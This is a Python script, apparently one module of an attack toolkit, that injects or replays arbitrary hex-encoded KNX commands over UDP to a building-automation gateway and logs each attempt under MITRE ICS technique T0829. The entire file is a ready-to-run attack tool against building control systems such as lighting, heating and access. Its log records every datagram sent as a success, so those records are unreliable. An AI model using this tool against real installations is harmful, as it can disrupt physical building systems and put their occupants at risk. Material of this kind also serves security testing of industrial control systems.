# modules/attacks/knx_replay_overwriter.py

import socket
import argparse
import time
import json
from datetime import datetime
import os

LOG_PATH = "results/knx_replay_logs.json"
MITRE_TTP = "T0829"

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_knx(ip, port, payload_hex):
    payload = bytes.fromhex(payload_hex)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.sendto(payload, (ip, port))
        log_attack({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "payload": payload_hex,
            "success": True,
            "ttp": MITRE_TTP
        })
        return True
    except Exception:
        return False
    finally:
        s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="KNX Traffic Overwriter & Replayer")
    parser.add_argument("--ip", required=True, help="KNX gateway IP")
    parser.add_argument("--port", type=int, default=3671, help="KNX UDP port (default 3671)")
    parser.add_argument("--payload", required=True, help="Hex string of KNX command to inject")
    args = parser.parse_args()

    if send_knx(args.ip, args.port, args.payload):
        print("[+] KNX command injected successfully")
    else:
        print("[!] KNX injection failed")
